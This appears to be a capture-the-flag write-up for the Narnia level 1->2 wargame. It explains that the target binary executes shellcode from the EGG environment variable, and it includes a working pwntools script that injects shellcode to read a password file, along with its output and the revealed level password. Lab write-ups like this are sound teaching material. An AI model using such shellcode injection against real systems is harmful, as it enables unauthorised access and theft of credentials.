## 1 -> 2

### Writeup 

Looking at the source code, I saw that the program expects machine code at the `EGG` environment variable. It does this without checking what is in the variable and executes the code directly.

To exploit this, I stored shellcode in the `EGG` environment variable to read `/etc/narnia_pass/narnia2`, which revealed the flag.

```
narnia1@narnia:/tmp/tmp.71ppkQpcRu$ python3 egg.py
[+] Starting local process '/narnia/narnia1': pid 439
[*] Switching to interactive mode
Trying to execute EGG!
0h8Tj5fxbv
[*] Got EOF while reading in interactive
```

<details>
  <summary>Flag</summary>0h8Tj5fxbv
</details>

### Script

```python
from pwn import *

context.os = "linux"

payload = shellcraft.cat("/etc/narnia_pass/narnia2")
env = {"EGG": asm(payload)}
process = process("/narnia/narnia1", env=env)
process.interactive()
```